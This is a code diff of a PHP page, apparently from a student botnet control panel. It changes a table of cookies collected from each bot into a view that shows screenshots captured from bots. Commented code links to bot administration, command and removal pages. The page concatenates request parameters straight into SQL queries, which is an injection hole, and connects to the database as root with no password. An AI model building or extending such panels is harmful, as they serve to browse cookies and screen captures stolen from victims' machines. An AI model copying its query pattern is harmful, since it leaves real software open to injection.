@@ -1,28 +1,38 @@
+<?php
+
+
+// // $image_data = base64_decode($base64_data);
+// $updatedString = str_replace(" ", "+", $string2);
+// $image_data = base64_decode($updatedString);
+
+
+
+// // Set the Content-Type header to indicate that you're sending an image
+// header("Content-Type: image/png"); // Change this content type to match the actual image type
+
+// // Output the image data
+// echo $image_data;
+?>
+
 
 
 <?php
 $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
 if (mysqli_connect_errno()) exit;
 
-$header_display = "Cookies Result";
+$header_display = "Capture Detail ";
 
-if (isset($_REQUEST['ID'])) {
-  $id = $_REQUEST['ID'];
-  $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
-  if (mysqli_connect_errno()) exit;
-  $sql = "Select * from cookies where IdBot = " . $id;
-  $rs = mysqli_query($db, $sql);
+
+if (isset($_REQUEST['IdCapture'])) {
+    $id = $_REQUEST['IdCapture'];
+    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
+    if (mysqli_connect_errno()) exit;
+    $sql = "select * from capture where IdCapture = ".$id;
+    $rs = mysqli_query($db, $sql);
+
+   
 }
-
-// while ($stmt->fetch()) {
-
-// 	$administer = "<a href='../php/openBot.php?ID=" . $ID . "'>administrator</a>";
-// 	$delete = "<a href='../php/handleRemoveBot.php?ID=" . $ID . "'>delete</a>";
-// 	$status_display = $status == 1 ? 'active' : 'non-active';
-// 	echo '<td>' . $ID . '</td> <td>' . $ip . '</td> <td>' . $port . '</td> <td>' . $administer . '</td> <td>' . $status_display  . '</td><td>' . $delete . '</td>';
-// }
-echo '
-<!DOCTYPE html>
+echo '<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
@@ -164,13 +174,10 @@ echo '
         color: #62fa62;
       }
       .content {
+        height: 92%;
         width: 100%;
         min-height: 90%;
         padding: 30px;
-        display:flex;
-        flex-direction: column;
-        justify-content: space-between;
-
       }
       .content_table {
         width: 100%;
@@ -191,17 +198,53 @@ echo '
         border: 1px solid #00ff00;
         max-width: 300px;
         white-space: nowrap;
-        overflow: hidden;       
+        overflow: hidden;
         text-overflow: ellipsis;
       }
-      .content_table-th{
+      .content_table-th {
         padding: 4px 0px;
       }
-      .link_detail{
+      .link_detail {
         color: #00ff00;
         text-decoration: underline;
       }
-       .content_back
+       .content_element {
+            width: 100%;
+            margin-bottom: 12px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            /* align-items: center; */
+        }
+
+        .content_element-label {
+            font-size: 16px;
+            min-width: 120px;
+            margin-bottom: 8px;
+            margin-left: 4px;
+        }
+
+        .content_element-input {
+            width: 100%;
+            padding: 4px 6px;
+            background: transparent;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            outline: none;
+            border-radius: 4px;
+        }
+        .content_image 
+        {
+            width: 100%;
+            height: 95%;
+        }
+        .content_image-img
+        {
+            display: block;
+            width: 100%;
+            height: 100%;
+        }
+        .content_back
         {
             margin-top:16px;
             color: #00ff00;
@@ -211,7 +254,7 @@ echo '
             text-decoration: underline;
             background: transparent;
             cursor:pointer;
-            align-self: flex-start;
+            
         }
     </style>
   </head>
@@ -247,50 +290,24 @@ echo '
           </ul>
         </div>
         <div class="content">
-          <table class="content_table">
-            <tr class="content_table-thead">
-              <th class="content_table-th">ID </th>
-              <th class="content_table-th">ID bot</th>
-              <th class="content_table-th">Time</th>
-              <th class="content_table-th">Url</th>
-              <th class="content_table-th">Cookies Result</th>
-                <th class="content_table-th">Detail</th>
-            </tr>';
+          ';
 
-// <tr class="content_table-tr">
-//   <td class="content_table-td">bbbbbbbbbbbb</td>
-//   <td class="content_table-td">bbbbbbbbbbbb</td>
-//   <td class="content_table-td">bbbbbbbbbbbb</td>
-//   <td class="content_table-td">bbbbbbbbbbbb</td>
-//   <td class="content_table-td">bbbbbbbbbbbb</td>
-//   <td class="content_table-td">bbbbbbbbbbbb</td>
-// </tr>
-if (isset($_REQUEST['ID'])) {
+if (isset($_REQUEST['IdCapture'])) {
 
-  while ($row = mysqli_fetch_array($rs)) {
-    echo '<tr class="content_table-tr">';
-    $detail = '<a class="link_detail" href="viewCookiesDetail.php?IdCookies=' . $row['IdCookies'] . '">detail</a>';
-    //    echo '<tr><td class="td"> ' . $row['IDNV'] . '</td><td class="td"> ' . $row['HoTen'] . '<td class="td"> ' . $row['DiaChi'] . '</td><td class="td"> ' . $row['IDPB'] . '</td></tr>';
-    echo '<td class="content_table-td">' . $row['IdCookies'] . '</td> <td class="content_table-td">' . $row['IdBot'] . '</td><td class="content_table-td">' . $row['Time'] . '</td> <td class="content_table-td">' . $row['Url'] . '</td> <td class="content_table-td">' . $row['CookiesResult'] . '</td> <td class="content_table-td">' . $detail . '</td>';
+    while ($row = mysqli_fetch_array($rs)) {
+        $imageBase64Db = $row['CaptureResult'];
+        $imageBase64 = str_replace(" ", "+", $imageBase64Db);
 
+        // $updatedString = str_replace(" ", "+", $string2);
+        // $image_data = base64_decode($imageBase64);
+        // echo $image_data;
 
-    echo '</tr>';
-  }
+        echo '<div class="content_image"><img class="content_image-img" src="data:image/png;base64,' . $imageBase64 . '" /></div>';
+    }
 }
-// while ($stmt->fetch()) {
-//     echo '<tr class="content_table-tr">';
-// $administer = $status == 1 ? "<a style='color:#00ff00;text-decoration:underline;' href='../php/openBot.php?ID=" . $ID . "'>administrator</a>" : "";
-// $delete = "<a style='color:#00ff00;text-decoration:underline;' href='../php/handleRemoveBot.php?ID=" . $ID . "'>hidden</a>";
-// $status_display = $status == 1 ? 'active' : 'non-active';
-// $cmd =
-//     "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewCmd.php?ID=" . $ID . "'>view</a>";
-//     echo '<td class="content_table-td">' . $ID . '</td> <td class="content_table-td">' . $ip . '</td> <td class="content_table-td">' . $port . '</td> <td class="content_table-td">' . $administer . '</td> <td class="content_table-td">' . $status_display  . '</td><td class="content_table-td"> ' . $cmd . '</td><td class="content_table-td"> view</td><td class="content_table-td"> view</td><td class="content_table-td"> view</td><td class="content_table-td">' . $delete . '</td>';
-//     echo '</tr>';
-// }
-echo '	
-          </table>
-          <button class="content_back" onclick="history.back()">Go Back</button>
 
+echo '
+        <button class="content_back" onclick="history.back()">Go Back</button>
         </div>
       </div>
       <div class="navigate">
@@ -319,6 +336,5 @@ echo '
     </div>
   </body>
 </html>
-
 ';
 ?>
